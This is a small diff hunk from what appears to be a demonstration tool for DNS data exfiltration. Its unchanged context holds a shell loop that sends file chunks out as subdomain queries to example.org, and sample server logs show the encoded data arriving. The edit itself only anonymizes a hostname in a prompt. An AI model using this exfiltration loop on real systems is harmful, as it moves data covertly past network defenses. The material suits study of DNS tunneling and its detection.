@@ -46,7 +46,7 @@ if __name__ == "__main__":
 ''' 
 for i in $(ls xaa*);do DATA=$(cat $i | tr -d "="); dig -p 10053 @localhost $DATA.example.org +short; done
 
-NXP-MAC-J6YKRQ77W0:code nxp$ python3 dns-data-exfil/dns-server.py 
+host:code host$ python3 dns-data-exfil/dns-server.py 
 Incoming query for: P06EFQYpolR7fqiCI4FZEyBvyCPlDMsSGuh.example.org
 Incoming query for: H4sIAEoP92QAA+2TMQqAMAxFO3uKXECJNW3.example.org
 Incoming query for: P06EFQYpolR7fqiCI4FZEyBvyCPlDMsSGuh.example.org
